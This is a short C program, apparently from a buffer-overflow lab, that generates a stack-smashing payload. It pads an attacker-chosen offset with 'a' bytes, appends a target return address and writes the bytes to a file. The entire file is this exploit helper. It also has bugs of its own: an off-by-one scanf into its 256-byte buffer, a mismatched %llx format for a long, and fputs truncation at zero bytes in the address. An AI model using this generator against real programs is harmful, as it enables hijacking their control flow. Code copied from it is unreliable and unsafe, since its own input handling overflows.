#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main()
{
    char buf[256];
    int distance;
    long address;
    puts("Enter file to write string to: ");
    scanf("%256s", buf);
    puts("Please enter distance in bytes between unsafe buffer adress and return address: ");
    scanf("%d %llx", &distance, &address);

    int stringSize = distance + sizeof(long) + 1;
    char* string = (char*) malloc(stringSize);
    for (int i = 0; i < distance; ++i)
    {
        string[i] = 'a';
    }
    *((long*) (string + distance)) = address;
    string[stringSize - 1] = '\0';
    
    FILE* file = fopen(buf, "w");
    fputs(string, file);
    fclose(file);
    return 0;
}